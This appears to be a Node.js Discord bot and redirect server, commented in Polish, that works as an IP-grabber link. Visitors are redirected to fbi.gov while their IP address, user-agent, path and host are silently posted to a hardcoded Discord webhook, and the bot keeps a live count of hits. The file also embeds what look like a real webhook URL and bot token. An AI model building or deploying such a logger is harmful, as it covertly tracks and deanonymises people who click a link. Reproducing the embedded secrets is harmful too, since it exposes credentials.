const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const https = require('https');
const http = require('http');
const { URL } = require('url');

// ===== KONFIGURACJA =====
const REDIRECT_URL = 'https://www.fbi.gov/';
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE';
const BOT_TOKEN = 'MTQ3NjAwMzcwODEwNTEzNDExMA.G2OIul.3fVojuSqE55cRm4ymZa81031nr_TZDIrxHUBPo'; // << WKLEJ TUTAJ NOWY RESETOWANY TOKEN!
const PREFIX = '.';
const PORT = process.env.PORT || 80;
// ========================

let totalRedirectHits = 0;
let activeStatsMessage = null;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

// ─── Funkcja: Edycja wiadomości bota (TYLKO TUTAJ JEST LICZNIK) ───────────────
async function updateBotStats() {
    if (!activeStatsMessage) return;
    const embed = new EmbedBuilder()
        .setTitle('📊 STATYSTYKI — NA ŻYWO')
        .setColor(0x5865F2)
        .addFields(
            { name: '🔗 Cel Redirectu', value: `\`${REDIRECT_URL}\``, inline: false },
            { name: '� ŁĄCZNIE WEJŚĆ', value: `\`${totalRedirectHits}\``, inline: true },
            { name: '🟢 Status', value: '`Monitorowanie...`', inline: true }
        )
        .setTimestamp();
    try {
        await activeStatsMessage.edit({ content: '', embeds: [embed] });
    } catch (e) {
        activeStatsMessage = null;
    }
}

// ─── Funkcja: Webhook (BEZ LICZNIKA - TYLKO LOGI) ───────────────────────────
function sendRedirectWebhook({ ip, method, path, userAgent, host, platform }) {
    const body = JSON.stringify({
        embeds: [{
            title: `🌐 Log Wejścia (${platform})`,
            color: 0x2F3136,
            fields: [
                { name: '🖥️ IP', value: `\`${ip || 'brak'}\``, inline: true },
                { name: '📄 Ścieżka', value: `\`${path || '/'}\``, inline: true },
                { name: '📬 Metoda', value: `\`${method || 'GET'}\``, inline: true },
                { name: '🔗 Host', value: `\`${host || 'brak'}\``, inline: true },
                { name: '🔍 User-Agent', value: `\`${(userAgent || 'brak').slice(0, 250)}\``, inline: false },
            ],
            timestamp: new Date().toISOString()
        }]
    });

    const url = new URL(WEBHOOK_URL);
    const req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => { if (res.statusCode !== 204) console.warn('Błąd Webhooka:', res.statusCode); });

    req.on('error', () => { });
    req.write(body);
    req.end();
}

// ─── Wspólna logika obsługi requestu ──────────────────────────────────────────
async function processHit(data) {
    totalRedirectHits++;
    console.log(`[ENTRY] #${totalRedirectHits} from ${data.ip}`);

    // 1. Edytuj wiadomość bota (Licznik go góry!)
    updateBotStats();

    // 2. Poślij webhooka (Bez licznika!)
    sendRedirectWebhook(data);
}

// ─── Discord Bot Komendy ─────────────────────────────────────────────────────
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const command = message.content.slice(PREFIX.length).trim().split(/\s+/)[0].toLowerCase();

    if (command === 'start') {
        totalRedirectHits = 0;
        const embed = new EmbedBuilder().setTitle('🚀 Monitorowanie wystartowało!').setColor(0xFFA500);
        activeStatsMessage = await message.channel.send({ embeds: [embed] });
        await message.delete().catch(() => { });
    }

    if (command === 'stop') {
        if (activeStatsMessage) {
            await activeStatsMessage.edit({ content: '🛑 Zatrzymano licznik.', embeds: [] });
            activeStatsMessage = null;
        }
    }
});

// ─── NETLIFY (Serverless) ────────────────────────────────────────────────────
exports.handler = async (event) => {
    const data = {
        ip: event.headers['x-forwarded-for']?.split(',')[0] || event.headers['x-nf-client-connection-ip'] || 'brak',
        method: event.httpMethod,
        path: event.path,
        userAgent: event.headers['user-agent'],
        host: event.headers['host'],
        platform: 'Netlify'
    };

    // Na Netlify licznik bota nie zadziała (funkcja zaraz zniknie), ale webhook tak
    await processHit(data);

    return {
        statusCode: 302,
        headers: { 'Location': REDIRECT_URL, 'Cache-Control': 'no-store' },
        body: ''
    };
};

// ─── LOKALNY START ──────────────────────────────────────────────────────────
if (require.main === module) {
    // Jeśli Netlify odpala to jako build command - wyjdź bez błędu
    if (process.env.NETLIFY) {
        console.log('Netlify build - OK.');
        process.exit(0);
    }

    // Start serwera HTTP (Lokalnie)
    http.createServer((req, res) => {
        res.writeHead(302, { 'Location': REDIRECT_URL, 'Cache-Control': 'no-store' });
        res.end();
        processHit({
            ip: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
            method: req.method,
            path: req.url,
            userAgent: req.headers['user-agent'],
            host: req.headers['host'],
            platform: 'Lokalnie'
        });
    }).listen(PORT, '0.0.0.0', () => console.log(`✅ Serwer lokalny na porcie ${PORT}`));

    // Start bota z obsługą błędów (żeby nie wywalało serwera)
    console.log('🤖 Logowanie bota...');
    client.login(BOT_TOKEN).catch(e => {
        console.error('❌ BŁĄD BOTA (Pewnie zły token):', e.message);
        console.log('👉 Wejdź na Discord Dev Portal i zrób RESET TOKENU.');
    });
}

client.once('ready', () => {
    console.log(`✅ Bot gotowy jako ${client.user.tag}`);
});
